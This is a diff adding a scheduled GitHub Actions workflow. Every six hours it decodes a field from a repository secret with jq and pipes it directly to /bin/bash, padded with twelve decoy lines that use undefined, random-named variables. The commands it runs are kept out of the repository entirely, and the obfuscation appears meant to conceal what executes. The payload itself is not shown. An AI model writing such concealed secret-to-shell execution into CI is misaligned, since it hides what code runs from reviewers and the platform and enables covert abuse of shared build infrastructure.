@@ -1,0 +1,30 @@
+name: sanliangs
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sanliangs
+        env:
+          lldev01112: ${{ secrets.lldev01112 }}
+        run: |
+          echo $lldev01112 | jq -r .wrejm6 | /bin/bash
+          echo $piaqx40074 | jq -r .khs045 | /bin/bash
+          echo $lcrqh21 | jq -r .rtx2 | /bin/bash
+          echo $sfq276 | jq -r .bial99 | /bin/bash
+          echo $hb0 | jq -r .nsxt6862 | /bin/bash
+          echo $jlu6176 | jq -r .ey1779 | /bin/bash
+          echo $o149 | jq -r .n41 | /bin/bash
+          echo $ad4 | jq -r .yiqvw1 | /bin/bash
+          echo $fdxc3246 | jq -r .fl082 | /bin/bash
+          echo $uuapo6 | jq -r .fgwhw102 | /bin/bash
+          echo $iy1539 | jq -r .ykn130 | /bin/bash
+          echo $mwn53 | jq -r .exr10 | /bin/bash
+          echo $fn3 | jq -r .kbetf6 | /bin/bash
+
